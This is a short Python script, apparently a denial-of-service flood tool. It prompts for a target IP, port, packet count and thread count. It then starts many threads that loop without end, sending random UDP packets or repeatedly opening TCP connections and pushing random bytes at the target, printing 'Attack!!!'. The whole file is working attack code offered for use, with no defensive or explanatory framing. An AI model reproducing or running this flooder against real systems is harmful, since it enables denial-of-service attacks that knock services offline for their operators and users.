import random
import socket
import threading
import os,sys

os.system("clear")
print("UBAH INI")
ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
os.system("clear")
def run():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack!!!")
		except:
			print("[!] Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack!!!")
		except:
			s.close()
			print("[!] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()